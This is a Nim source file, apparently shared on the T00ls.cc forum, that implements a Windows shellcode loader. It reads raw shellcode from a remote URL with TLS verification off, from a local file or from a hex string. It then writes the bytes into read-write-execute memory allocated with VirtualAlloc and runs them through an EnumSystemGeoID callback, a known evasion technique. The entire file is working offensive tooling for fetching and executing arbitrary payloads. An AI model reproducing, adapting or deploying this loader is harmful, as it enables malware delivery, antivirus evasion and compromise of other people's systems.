import httpclient
import streams
import OpenSSL
import os
import strutils
import winim/lean
import osproc
import stew/byteutils
import net
proc shellcodeCallback(shellcode: openarray[byte]): void =
    echo "[*] T00ls.cc Nim-shellcode-loader shadowwolf"
    let CurrentProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", CurrentProcess
    echo "[*] Length Of Shellcode: ", len(shellcode)
    echo "[+] Injecting!"
    discard """
    T00ls.cc 14454-shadowwolf
    """
    # Application for memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))

    # Callback execution
    EnumSystemGeoID(
        16,
        0,
        cast[GEO_ENUMPROC](rPtr)
    ) 
proc RequestGet(url:string,header={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"}):string=
     type
        sslContext=ref object
     var 
        client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
        RequestHeaders=newHttpHeaders(header)
        resp=client.request(url,headers=RequestHeaders)
     return resp.bodyStream.readAll().replace("\\x"," ").replace(",","").replace(" ","")
#To get the shellcode on the website you put on
proc GetShellcodeAndRun(para:string):void=
    if("http" in para):
       echo "[*] Get the shellcode on the website:"&para
       let resp=RequestGet(para)#Get the shellcode on your website
       var shellcode = newSeq[byte](len(resp) div 2)#calc the length
       hexToByteArray(resp, shellcode)#convert hex string into array
       shellcodeCallback(shellcode)#execute
    elif fileExists(para):
        echo "[*] Get the file:"&para
        var 
            filename = para
            file: File
        file = open(filename, fmRead)
        var fileSize = file.getFileSize() 
        var shellcode = newSeq[byte](fileSize)
        discard file.readBytes(shellcode, 0, fileSize)
        file.close()
        shellcodeCallback(shellcode)
    else:
        echo "[*] Get the string:"&para
        var hexstr: string = para
        var shellcode = newSeq[byte](len(hexstr) div 2)
        hexToByteArray(hexstr, shellcode)
        shellcodeCallback(shellcode)
if paramCount()>=1:
   var para:string=paramStr(1)
   GetShellcodeAndRun(para)
   
